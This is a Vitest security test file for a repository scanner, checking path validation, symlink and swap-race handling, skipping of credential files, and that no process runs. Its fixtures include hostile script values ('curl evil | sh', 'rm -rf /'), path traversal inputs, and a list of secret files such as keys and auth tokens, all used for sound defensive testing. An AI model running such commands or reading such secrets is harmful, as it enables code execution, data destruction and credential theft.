// Security properties of the scanner: root validation, containment, links,
// swap races, sensitive files and "nothing executed". fs is spied on (never
// mocked away) so the tests prove which paths were actually opened.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";

const h = vi.hoisted(() => ({ executed: [] as string[] }));
// Any process execution from the scanner fails loudly.
vi.mock("child_process", () => {
  const forbid = (name: string) => (...args: unknown[]) => {
    h.executed.push(`${name} ${String(args[0])}`);
    throw new Error("scanner must not execute processes");
  };
  return { spawn: forbid("spawn"), exec: forbid("exec"), execFile: forbid("execFile"), fork: forbid("fork"), spawnSync: forbid("spawnSync"), execSync: forbid("execSync"), execFileSync: forbid("execFileSync") };
});
vi.mock("node:child_process", async () => await import("child_process"));

import { scanRepository } from "../../../electron/repoScanner/scanRepository.js";
import { isWithin, resolveScanRoot, samePath } from "../../../electron/repoScanner/scanRoot.js";
import { RepoScanError } from "../../../electron/repoScanner/types.js";
import { FixtureSpace, pkg } from "./fixtures.js";

let space: FixtureSpace;
let outside: string;
const CANARY = "CANARY-SECRET-7f3a9c";

beforeAll(() => {
  space = new FixtureSpace();
  outside = space.repo("outside", {
    "package.json": pkg({ name: `outside-${CANARY}` }),
    "secret.txt": CANARY,
    ".nvmrc": "v99",
  });
});
afterAll(() => {
  expect(fs.readFileSync(path.join(outside, "secret.txt"), "utf8")).toBe(CANARY); // never touched
  space.cleanup();
});
afterEach(() => {
  vi.restoreAllMocks();
});

/** Records every path the scanner opens, lists or inspects. */
function recordFsAccess() {
  const opened: string[] = [];
  const listed: string[] = [];
  const open = fs.promises.open;
  const opendir = fs.promises.opendir;
  vi.spyOn(fs.promises, "open").mockImplementation(((p: fs.PathLike, ...rest: unknown[]) => {
    opened.push(path.resolve(String(p)));
    return (open as (...a: unknown[]) => unknown)(p, ...rest);
  }) as never);
  vi.spyOn(fs.promises, "opendir").mockImplementation(((p: fs.PathLike, ...rest: unknown[]) => {
    listed.push(path.resolve(String(p)));
    return (opendir as (...a: unknown[]) => unknown)(p, ...rest);
  }) as never);
  const readFile = vi.spyOn(fs.promises, "readFile");
  const readFileSync = vi.spyOn(fs, "readFileSync");
  const createReadStream = vi.spyOn(fs, "createReadStream");
  return { opened, listed, readFile, readFileSync, createReadStream };
}

/** Windows only allows file symlinks with Developer Mode or admin rights. */
function fileSymlinksPermitted(): boolean {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "rr-symlink-probe-"));
  try {
    fs.writeFileSync(path.join(dir, "t"), "");
    fs.symlinkSync(path.join(dir, "t"), path.join(dir, "l"), "file");
    return true;
  } catch {
    return false;
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const insideOutside = (paths: string[]) => paths.filter((p) => isWithin(outside, p));

async function expectScanError(input: unknown, code: string) {
  const error = await scanRepository(input).catch((e: unknown) => e);
  expect(error).toBeInstanceOf(RepoScanError);
  expect((error as RepoScanError).code).toBe(code);
  // Fixed messages: never echo the path or a filesystem error.
  if (typeof input === "string" && input.length > 3) expect((error as Error).message).not.toContain(input);
  expect((error as Error).message).not.toMatch(/ENOENT|EACCES|EPERM|stat|realpath/i);
}

describe("root validation", () => {
  it.each([
    ["not a string", 42],
    ["empty", ""],
    ["relative", "some/relative/repo"],
    ["dot-relative", "./repo"],
    ["NUL byte", "C:\\repo\0evil"],
    ["too long", `C:\\${"a".repeat(5000)}`],
  ])("rejects %s as invalid-path", async (_label, input) => {
    await expectScanError(input, "invalid-path");
  });

  it.runIf(process.platform === "win32").each([
    ["drive-relative", "C:repo"],
    ["root-relative", "\\Users\\x\\repo"],
  ])("Windows: rejects %s as invalid-path", async (_label, input) => {
    await expectScanError(input, "invalid-path");
  });

  it.runIf(process.platform === "win32").each([
    ["UNC share", "\\\\server\\share\\repo"],
    ["forward-slash UNC", "//server/share/repo"],
    ["device path", "\\\\?\\C:\\repo"],
    ["device namespace", "\\\\.\\C:\\repo"],
  ])("Windows: rejects %s as root-not-allowed (no network access attempted)", async (_label, input) => {
    const realpath = vi.spyOn(fs.promises, "realpath");
    await expectScanError(input, "root-not-allowed");
    expect(realpath).not.toHaveBeenCalled();
  });

  it("rejects the drive/filesystem root", async () => {
    await expectScanError(path.parse(process.cwd()).root, "root-not-allowed");
  });

  it("rejects the home folder itself and its parent", async () => {
    await expectScanError(os.homedir(), "root-not-allowed");
    await expectScanError(path.dirname(os.homedir()), "root-not-allowed");
  });

  it.runIf(process.platform === "win32")("Windows: rejects the Windows folder and anything inside it", async () => {
    const windir = process.env.SystemRoot ?? "C:\\Windows";
    await expectScanError(windir, "root-not-allowed");
    await expectScanError(path.join(windir, "System32"), "root-not-allowed");
  });

  it.runIf(process.platform !== "win32")("POSIX: rejects system folders", async () => {
    await expectScanError("/etc", "root-not-allowed");
    await expectScanError("/usr", "root-not-allowed");
  });

  it("rejects missing paths and files", async () => {
    await expectScanError(path.join(space.base, "does-not-exist"), "not-found");
    const file = path.join(space.repo("has file", { "f.txt": "x" }), "f.txt");
    await expectScanError(file, "not-a-directory");
  });

  it("resolves the root through realpath (a link given as the root is scanned at its real location)", async () => {
    const real = space.repo("real target", { "package.json": pkg({ name: "real" }) });
    const link = path.join(space.base, "root link");
    space.dirLink(link, real);
    expect(samePath(await resolveScanRoot(link), real)).toBe(true);
  });
});

describe("containment helpers", () => {
  it("isWithin uses path segments, not string prefixes", () => {
    const base = path.join(space.base, "repo");
    expect(isWithin(base, base)).toBe(true);
    expect(isWithin(base, path.join(base, "a", "b"))).toBe(true);
    expect(isWithin(base, path.join(base, "..foo"))).toBe(true); // a folder literally named "..foo"
    expect(isWithin(base, `${base}-evil`)).toBe(false);
    expect(isWithin(base, path.join(base, "..", "other"))).toBe(false);
    expect(isWithin(base, path.dirname(base))).toBe(false);
  });

  it.runIf(process.platform === "win32")("Windows: containment and equality are case-insensitive", () => {
    expect(isWithin("C:\\Repo\\App", "c:\\repo\\app\\src")).toBe(true);
    expect(samePath("C:\\Repo\\App", "c:\\REPO\\app")).toBe(true);
    expect(isWithin("C:\\Repo\\App", "D:\\Repo\\App")).toBe(false);
  });
});

describe("links are never followed", () => {
  it("a junction/symlink to a folder outside the root is skipped; nothing outside is listed or opened", async () => {
    const root = space.repo("link out", { "package.json": pkg({ name: "inside" }) });
    space.dirLink(path.join(root, "escape"), outside);
    const access = recordFsAccess();

    const result = await scanRepository(root);

    expect(result.skipped.links).toBe(1);
    expect(result.packages.map((p) => p.name)).toEqual(["inside"]);
    expect(insideOutside(access.listed)).toEqual([]);
    expect(insideOutside(access.opened)).toEqual([]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });

  it("a link loop back to an ancestor terminates without revisiting", async () => {
    const root = space.repo("loop", { "a/b/package.json": pkg({ name: "deep" }) });
    space.dirLink(path.join(root, "a", "b", "back-to-root"), root);
    space.dirLink(path.join(root, "a", "self"), path.join(root, "a"));

    const result = await scanRepository(root);

    expect(result.status).toBe("complete");
    expect(result.skipped.links).toBe(2);
    expect(result.stats.directoriesVisited).toBe(3); // root, a, a/b
    expect(result.packages.map((p) => p.name)).toEqual(["deep"]);
  });

  it.runIf(fileSymlinksPermitted())("a symlinked package.json pointing outside is never read", async () => {
    const root = space.repo("file link");
    expect(space.fileLink(path.join(root, "package.json"), path.join(outside, "package.json"))).toBe(true);
    const access = recordFsAccess();

    const result = await scanRepository(root);

    expect(result.packages).toEqual([]);
    expect(result.skipped.links).toBe(1);
    expect(insideOutside(access.opened)).toEqual([]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });
});

describe("paths swapped during the scan", () => {
  it("a folder replaced by a link after listing is not entered", async () => {
    const root = space.repo("dir swap", { "sub/package.json": pkg({ name: "original" }) });
    const lstat = fs.promises.lstat;
    let swapped = false;
    vi.spyOn(fs.promises, "lstat").mockImplementation((async (p: fs.PathLike, opts?: never) => {
      if (!swapped && path.resolve(String(p)) === path.join(root, "sub")) {
        swapped = true;
        fs.renameSync(path.join(root, "sub"), path.join(root, "sub-moved"));
        space.dirLink(path.join(root, "sub"), outside);
      }
      return lstat(p, opts);
    }) as never);
    const access = recordFsAccess();

    const result = await scanRepository(root);

    expect(swapped).toBe(true);
    expect(result.warnings).toContainEqual({ code: "changed-during-scan", path: "sub" });
    expect(insideOutside(access.listed)).toEqual([]);
    expect(insideOutside(access.opened)).toEqual([]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });

  it("package.json replaced by a link after listing is not read", async () => {
    const root = space.repo("file swap", { "package.json": pkg({ name: "original" }) });
    const lstat = fs.promises.lstat;
    let swapped = false;
    vi.spyOn(fs.promises, "lstat").mockImplementation((async (p: fs.PathLike, opts?: never) => {
      if (!swapped && path.resolve(String(p)) === path.join(root, "package.json")) {
        swapped = true;
        fs.unlinkSync(path.join(root, "package.json"));
        space.dirLink(path.join(root, "package.json"), outside); // a junction needs no privilege
      }
      return lstat(p, opts);
    }) as never);
    const access = recordFsAccess();

    const result = await scanRepository(root);

    expect(result.packages).toEqual([]);
    expect(result.warnings).toContainEqual({ code: "changed-during-scan", path: "package.json" });
    expect(insideOutside(access.opened)).toEqual([]);
  });

  it("a file swapped between the checks and opening is detected by its identity and not used", async () => {
    const root = space.repo("identity swap", { "package.json": pkg({ name: "checked" }) });
    const open = fs.promises.open;
    let swapped = false;
    vi.spyOn(fs.promises, "open").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
      if (!swapped && path.resolve(String(p)) === path.join(root, "package.json")) {
        swapped = true;
        fs.renameSync(path.join(root, "package.json"), path.join(root, "old.json"));
        fs.writeFileSync(path.join(root, "package.json"), pkg({ name: "swapped-in" }));
      }
      return (open as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);

    const result = await scanRepository(root);

    expect(swapped).toBe(true);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toContainEqual({ code: "changed-during-scan", path: "package.json" });
  });
});

describe("residual race windows still expose no file contents", () => {
  it("a folder swapped for a link after its final check: names may be listed, but nothing inside is opened", async () => {
    const root = space.repo("late dir swap", { "sub/package.json": pkg({ name: "original" }) });
    const opendir = fs.promises.opendir;
    let swapped = false;
    vi.spyOn(fs.promises, "opendir").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
      if (!swapped && path.resolve(String(p)) === path.join(root, "sub")) {
        // After verifyDirectory() passed, before the listing: the documented residual window.
        swapped = true;
        fs.renameSync(path.join(root, "sub"), path.join(root, "sub-moved"));
        space.dirLink(path.join(root, "sub"), outside);
      }
      return (opendir as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);
    // Record opens separately (recordFsAccess would replace the opendir spy above).
    const opened: string[] = [];
    const open = fs.promises.open;
    vi.spyOn(fs.promises, "open").mockImplementation(((p: fs.PathLike, ...rest: unknown[]) => {
      opened.push(path.resolve(String(p)));
      return (open as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);

    const result = await scanRepository(root);

    expect(swapped).toBe(true);
    // Only the root directory handle (for its volume ID); no file inside or outside.
    expect(opened).toEqual([root]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toContainEqual({ code: "changed-during-scan", path: "sub/package.json" });
  });

  it("a parent folder swapped for a link at the moment a manifest is opened is rejected by identity", async () => {
    const root = space.repo("parent swap", { "a/package.json": pkg({ name: "inside" }) });
    const open = fs.promises.open;
    let swapped = false;
    vi.spyOn(fs.promises, "open").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
      if (!swapped && path.resolve(String(p)) === path.join(root, "a", "package.json")) {
        swapped = true;
        fs.renameSync(path.join(root, "a"), path.join(root, "a-moved"));
        space.dirLink(path.join(root, "a"), outside); // outside also has a package.json
      }
      return (open as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);

    const result = await scanRepository(root);

    expect(swapped).toBe(true);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toContainEqual({ code: "changed-during-scan", path: "a/package.json" });
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });
});

describe("misleading file names", () => {
  it("only exact package.json / .nvmrc / .node-version names are ever opened", async () => {
    const misleading = [
      "package.json.bak",
      "package.json.key",
      "package.json.pem",
      "my-package.json",
      "package-json",
      ".nvmrc.secret",
      ".nvmrc.bak",
      ".node-version.old",
      "node-version",
      "nvmrc",
      ".envrc",
      "prod.env",
      "package.json.env",
    ];
    const tree: Record<string, string> = { "package.json": pkg({ name: "real" }), ".nvmrc": "20" };
    for (const name of misleading) tree[name] = CANARY;
    const root = space.repo("misleading names", tree);
    const access = recordFsAccess();

    const result = await scanRepository(root);

    const openedNames = access.opened.filter((p) => p !== root).map((p) => path.basename(p)).sort();
    expect(openedNames).toEqual([".nvmrc", "package.json"]);
    expect(access.opened.filter((p) => p === root)).toHaveLength(1); // the root directory handle
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });
});

describe("repository content never chooses paths", () => {
  it("workspace patterns with traversal are reported as text only", async () => {
    const root = space.repo("traversal patterns", {
      "package.json": pkg({ name: "mono", workspaces: ["../outside", "../../*", outside, "C:\\Windows\\*", "/etc/*"] }),
    });
    const access = recordFsAccess();

    const result = await scanRepository(root);

    expect(result.workspace.patterns).toContain("../outside");
    expect(insideOutside(access.listed)).toEqual([]);
    expect(insideOutside(access.opened)).toEqual([]);
    expect(access.listed.every((p) => isWithin(root, p))).toBe(true);
    expect(access.opened.every((p) => isWithin(root, p))).toBe(true);
  });
});

describe("sensitive files", () => {
  const SENSITIVE: Record<string, string> = {
    ".env": `API_KEY=${CANARY}`,
    ".env.local": `DB=${CANARY}`,
    "config/.env.production": `X=${CANARY}`,
    "id_rsa": `-----BEGIN OPENSSH PRIVATE KEY-----${CANARY}`,
    "certs/server.key": CANARY,
    "certs/server.pem": CANARY,
    "certs/client.p12": CANARY,
    ".npmrc": `//registry.npmjs.org/:_authToken=${CANARY}`,
    ".yarnrc.yml": `npmAuthToken: ${CANARY}`,
    "credentials.json": CANARY,
    "aws/credentials": CANARY,
    "secrets.yaml": CANARY,
    "infra/prod.tfvars": CANARY,
    ".git-credentials": CANARY,
  };

  it("are never opened, and their contents never appear in the result", async () => {
    const root = space.repo("sensitive", { ...SENSITIVE, "package.json": pkg({ name: "app" }), "src/app.ts": CANARY });
    const access = recordFsAccess();

    const result = await scanRepository(root);

    const openedNames = access.opened.map((p) => path.relative(root, p).split(path.sep).join("/"));
    expect(openedNames).toEqual(["", "package.json"]); // the root directory handle, then the only file opened
    expect(access.readFile).not.toHaveBeenCalled();
    expect(access.readFileSync).not.toHaveBeenCalled();
    expect(access.createReadStream).not.toHaveBeenCalled();
    expect(JSON.stringify(result)).not.toContain(CANARY);
    expect(result.envFiles.sort()).toEqual([".env", ".env.local", "config/.env.production"]);
    expect(result.skipped.sensitiveFiles).toBe(Object.keys(SENSITIVE).length);
  });

  it("a malformed package.json full of secrets yields only a fixed warning", async () => {
    const root = space.repo("secret malformed", { "package.json": `{ "token": "${CANARY}", oops` });
    const result = await scanRepository(root);
    expect(result.warnings).toEqual([{ code: "manifest-malformed", path: "package.json" }]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });
});

describe("nothing is executed and nothing goes over the network", () => {
  it("scans run without any process execution", async () => {
    const root = space.repo("exec check", { "package.json": pkg({ name: "x", scripts: { postinstall: "curl evil | sh", preinstall: "rm -rf /" } }) });
    await scanRepository(root);
    expect(h.executed).toEqual([]);
  });

  it("scanner sources import only fs, path, os and the shared types (no processes, network or dynamic code)", () => {
    const dir = path.resolve(import.meta.dirname, "../../../electron/repoScanner");
    for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".ts"))) {
      const source = fs.readFileSync(path.join(dir, file), "utf8");
      const imports = [...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]);
      for (const spec of imports) {
        // ../../src/types.js holds only the shared fixed error messages.
        expect(["node:fs", "node:path", "node:os", "../../src/types.js"].includes(spec) || spec.startsWith("./"), `${file}: ${spec}`).toBe(true);
      }
      expect(source, file).not.toMatch(/child_process|require\(|\beval\(|new Function\(|\bfetch\(|import\(/);
    }
  });
});

describe("runtimes whose path-based stat reports device 0 (Electron 35 / Node 22 on Windows)", () => {
  type AnyStats = fs.Stats | fs.BigIntStats;
  const withDevice = <T extends AnyStats>(st: T, dev: bigint | number): T =>
    Object.assign(Object.create(Object.getPrototypeOf(st)), st, { dev });

  /** Every lstat reports device 0, as Electron 35 does on Windows. */
  function zeroDeviceLstat() {
    const lstat = fs.promises.lstat;
    vi.spyOn(fs.promises, "lstat").mockImplementation((async (p: fs.PathLike, opts?: fs.StatOptions) => {
      const st = (await (lstat as (...a: unknown[]) => Promise<AnyStats>)(p, opts)) as AnyStats;
      return withDevice(st, typeof st.dev === "bigint" ? 0n : 0);
    }) as never);
  }

  /** File handles report a different volume (same file ID): a swapped-in file from elsewhere. */
  function fileHandlesOnAnotherVolume() {
    const open = fs.promises.open;
    vi.spyOn(fs.promises, "open").mockImplementation((async (...args: unknown[]) => {
      const handle = await (open as (...a: unknown[]) => Promise<fs.promises.FileHandle>)(...args);
      return new Proxy(handle, {
        get(target, prop) {
          if (prop === "stat") {
            return async (o?: fs.StatOptions) => {
              const st = (await target.stat(o as never)) as unknown as fs.BigIntStats;
              return st.isFile() ? withDevice(st, st.dev + 1n) : st;
            };
          }
          const value = Reflect.get(target, prop, target);
          return typeof value === "function" ? value.bind(target) : value;
        },
      });
    }) as never);
  }

  it("manifests are still read, using the root directory's volume", async () => {
    const root = space.repo("zero device", { "package.json": pkg({ name: "zero-dev" }), ".nvmrc": "20" });
    zeroDeviceLstat();
    const result = await scanRepository(root);
    expect(result.packages.map((p) => p.name)).toEqual(["zero-dev"]);
    expect(result.nodeVersionFiles).toEqual([{ path: ".nvmrc", version: "20" }]);
    expect(result.warnings).toEqual([]);
  });

  it("a same-ID file on another volume is rejected", async () => {
    const root = space.repo("zero device other volume", { "package.json": pkg({ name: `x-${CANARY}` }) });
    zeroDeviceLstat();
    fileHandlesOnAnotherVolume();
    const result = await scanRepository(root);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toEqual([{ code: "changed-during-scan", path: "package.json" }]);
    expect(JSON.stringify(result)).not.toContain(CANARY);
  });

  it("without the root's volume, files are skipped (fail closed)", async () => {
    const root = space.repo("zero device no root handle", { "package.json": pkg({ name: `x-${CANARY}` }) });
    zeroDeviceLstat();
    const open = fs.promises.open;
    vi.spyOn(fs.promises, "open").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
      if (path.resolve(String(p)) === root) throw Object.assign(new Error("EPERM"), { code: "EPERM" });
      return (open as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);
    const result = await scanRepository(root);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toEqual([{ code: "changed-during-scan", path: "package.json" }]);
  });

  it("with real devices, a handle on another volume is rejected too", async () => {
    const root = space.repo("real device other volume", { "package.json": pkg({ name: "y" }) });
    fileHandlesOnAnotherVolume();
    const result = await scanRepository(root);
    expect(result.packages).toEqual([]);
    expect(result.warnings).toEqual([{ code: "changed-during-scan", path: "package.json" }]);
  });
});

describe("the root directory handle", () => {
  /** Tracks handles opened on `root` and whether each was closed. */
  function trackRootHandles(root: string, failStat = false) {
    const handles: Array<{ flags: unknown; closed: boolean }> = [];
    const open = fs.promises.open;
    vi.spyOn(fs.promises, "open").mockImplementation((async (p: fs.PathLike, flags?: unknown, ...rest: unknown[]) => {
      const handle = await (open as (...a: unknown[]) => Promise<fs.promises.FileHandle>)(p, flags, ...rest);
      if (path.resolve(String(p)) !== root) return handle;
      const entry = { flags, closed: false };
      handles.push(entry);
      return new Proxy(handle, {
        get(target, prop) {
          if (prop === "close") return async () => { entry.closed = true; return target.close(); };
          if (prop === "stat" && failStat) return async () => { throw Object.assign(new Error("EIO"), { code: "EIO" }); };
          const value = Reflect.get(target, prop, target);
          return typeof value === "function" ? value.bind(target) : value;
        },
      });
    }) as never);
    return handles;
  }

  it("is opened read-only once and always closed", async () => {
    const root = space.repo("root handle normal", { "package.json": pkg({ name: "r" }) });
    const handles = trackRootHandles(root);
    const result = await scanRepository(root);
    expect(result.packages.map((p) => p.name)).toEqual(["r"]);
    expect(handles).toHaveLength(1);
    expect(handles[0].closed).toBe(true);
    const flags = Number(handles[0].flags);
    expect(flags & (fs.constants.O_WRONLY | fs.constants.O_RDWR | fs.constants.O_CREAT | fs.constants.O_TRUNC | fs.constants.O_APPEND)).toBe(0);
  });

  it("is closed when reading its identity fails, and the scan still completes safely", async () => {
    const root = space.repo("root handle stat error", { "package.json": pkg({ name: "r" }) });
    const handles = trackRootHandles(root, true);
    const result = await scanRepository(root);
    expect(handles).toHaveLength(1);
    expect(handles[0].closed).toBe(true);
    expect(result.status).toBe("complete");
  });

  it("is not opened at all for an already-cancelled scan", async () => {
    const root = space.repo("root handle cancelled", { "package.json": pkg({ name: "r" }) });
    const handles = trackRootHandles(root);
    const controller = new AbortController();
    controller.abort();
    const result = await scanRepository(root, { signal: controller.signal });
    expect(result.status).toBe("cancelled");
    expect(handles).toEqual([]);
  });
});
